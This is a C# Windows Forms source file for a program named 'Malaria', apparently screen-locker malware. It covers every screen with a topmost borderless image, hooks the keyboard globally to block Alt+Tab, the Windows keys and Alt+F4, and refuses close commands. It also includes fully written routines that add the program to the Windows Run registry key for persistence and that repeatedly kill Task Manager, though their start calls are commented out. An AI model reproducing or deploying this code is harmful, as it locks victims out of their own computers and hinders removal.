using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using Malaria.Properties;
using Microsoft.Win32;

namespace Malaria
{
    public partial class Malaria : Form
    {
        private IKeyboardMouseEvents _globalHook;

        public Malaria()
        {
            InitializeComponent();
            DisplayImageOnAllScreens();
            // new Thread(KillTaskManager).Start();
            // new Thread(AutoStart).Start();
            KeyPreview = true;
            _globalHook = Hook.GlobalEvents();
            _globalHook.KeyDown += GlobalHook_KeyDown;
        }

        private void GlobalHook_KeyDown(object sender, KeyEventArgs e)
        {
            // Block ALT + TAB
            if (e.Alt && e.KeyCode == Keys.Tab)
            {
                e.Handled = true; // Prevent the default action
                return;
            }

            // Block WIN + D
            if (e.KeyCode == Keys.LWin || e.KeyCode == Keys.RWin)
            {
                e.Handled = true; // Prevent the default action
                return;
            }

            // Block ALT + F4
            if (e.Alt && e.KeyCode == Keys.F4)
            {
                e.Handled = true; // Prevent the default action
                return;
            }
        }

        private static void AutoStart()
        {
            var registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            registryKey?.SetValue("Malaria", Application.ExecutablePath);
        }

        private static void DisplayImageOnAllScreens()
        {
            foreach (var screen in Screen.AllScreens)
            {
                var form = new Form
                {
                    StartPosition = FormStartPosition.CenterScreen,
                    Location = screen.Bounds.Location,
                    Size = screen.Bounds.Size,
                    FormBorderStyle = FormBorderStyle.None,
                    WindowState = FormWindowState.Maximized,
                    TopMost = true,
                    BackgroundImageLayout = ImageLayout.Stretch
                };

                var imageResource = Resources.ResourceManager.GetObject("bg");

                if (imageResource is byte[] imageBytes)
                {
                    form.BackgroundImage = Image.FromStream(new MemoryStream(imageBytes));
                }
                else if (imageResource is Image image)
                {
                    form.BackgroundImage = image;
                }

                form.Show();
            }
        }

        private static void KillTaskManager()
        {
            while (true)
            {
                var processes = Process.GetProcessesByName("taskmgr");
                foreach (var process in processes) process.Kill();
            }
        }

        protected override void WndProc(ref Message m)
        {
            const int wmSysCommand = 0x0112;
            const int scClose = 0xF060;

            // Block ALT + F4
            if (m.Msg == wmSysCommand && (int)m.WParam == scClose)
            {
                return; // Prevent the form from closing
            }

            base.WndProc(ref m); // Call the base method to ensure normal processing for other messages
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Unhook the global hook when the form is closing
            _globalHook.KeyDown -= GlobalHook_KeyDown;
            _globalHook.Dispose();
            base.OnFormClosing(e);
        }
    }
}